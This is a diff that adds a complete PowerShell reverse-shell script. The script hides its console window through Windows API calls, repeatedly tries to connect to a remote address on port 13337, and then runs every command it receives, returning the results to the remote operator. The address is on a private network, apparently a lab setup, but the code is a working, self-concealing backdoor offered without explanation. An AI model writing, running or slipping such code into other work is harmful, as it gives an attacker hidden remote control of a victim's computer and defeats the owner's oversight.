@@ -1,0 +1,63 @@
+# Define a function to hide the console window using Windows API
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        public static void Hide() {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, 0); // 0 = SW_HIDE
+        }
+    }
+"@ 
+
+# Hide the console window
+[ConsoleWindow]::Hide()
+
+# Persistent runspace setup
+$runspace = [runspacefactory]::CreateRunspace()
+$runspace.Open()
+
+do {
+    try {
+        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.200', 13337)
+    } catch {}
+    Start-Sleep -Seconds 1
+} while (-not $TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$StreamReader = New-Object IO.StreamReader($NetworkStream)
+
+$StreamWriter.WriteLine('SHELL> ')
+$StreamWriter.Flush()
+
+while ($true) {
+    $Command = $StreamReader.ReadLine()
+    if ($Command -eq 'exit') {
+        break
+    }
+
+    $pipeline = [powershell]::Create().AddScript($Command).AddCommand("Out-String")
+    $pipeline.Runspace = $runspace
+    $Result = $pipeline.Invoke()
+
+    $Output = $Result | Out-String
+
+    if ($pipeline.Streams.Error.Count -gt 0) {
+        $Output = $pipeline.Streams.Error | Select -ExpandProperty ToString | Out-String
+    }
+
+    $StreamWriter.Write($Output)
+    $StreamWriter.WriteLine('SHELL> ')
+    $StreamWriter.Flush()
+}
+
+$StreamWriter.Close()
+$TCPClient.Close()
+$runspace.Close()
